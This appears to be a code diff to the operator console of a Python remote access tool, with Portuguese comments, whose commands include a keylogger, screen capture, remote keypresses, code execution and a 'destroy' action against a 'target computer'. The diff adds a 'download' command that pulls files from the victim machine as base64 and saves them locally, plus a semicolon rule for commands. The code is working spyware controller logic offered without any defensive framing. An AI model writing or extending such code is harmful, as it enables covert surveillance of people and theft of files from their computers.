@@ -38,6 +38,7 @@ class Terminal(object):
             "copy": lambda args: copy(self.output),
             "clear": lambda args: self.clear_screen(),
             "destroy": lambda args: self.destroy(),
+            "download": lambda filename: self.download(filename),
             "help": lambda args: self.help(),
             "keylogger": lambda args: self.show_keys(),
             "print": lambda args: self.print_screen(),
@@ -60,7 +61,7 @@ class Terminal(object):
 
         if not self.hasUser(): return  
       
-        self.output = self.send("#self.activate()") if status else self.send("#self.stop()")
+        self.output = self.send("#self.activate();") if status else self.send("#self.stop();")
         print(" " + self.output)
 
 
@@ -98,6 +99,21 @@ class Terminal(object):
         """
         
         send(url = self.destroy_url, text = "True")
+
+
+    def download(self, filename):
+
+        """
+        Baixa um arquivo do computador alvo.
+        """
+
+        if not self.hasUser(): return
+
+        output = self.send('#self.download(r"{}");'.format(filename))
+        data = base64.b64decode(output)
+
+        with open(os.path.split(filename)[-1], "wb") as file:
+            file.write(data)
 
 
     def get_code(self):
@@ -138,7 +154,7 @@ class Terminal(object):
         if not self.hasUser(): return
 
         # Obtém os bytes da imagem.
-        output = self.send("#self.print_screen()")
+        output = self.send("#self.print_screen();")
         image_data = base64.b64decode(output)
 
         # Mostra a imagem.
@@ -175,6 +191,11 @@ class Terminal(object):
             # Verifica se um usuário foi selecionado.
             elif not self.__username:
                 print(" No users were selected.")
+                continue
+
+            # Verifica se o comando acaba com ponto e vírgula.
+            elif not command.endswith(";"):
+                print(' Use ";" at the end of each command.')
                 continue
 
             # Envia um comando para o computador alvo.
@@ -295,7 +316,7 @@ class Terminal(object):
             keys.append(char)
 
         # Envia o comando.
-        self.output = self.send("#pyautogui.press({})".format(keys))
+        self.output = self.send("#pyautogui.press({});".format(keys))
         print(" " + self.output)
 
 
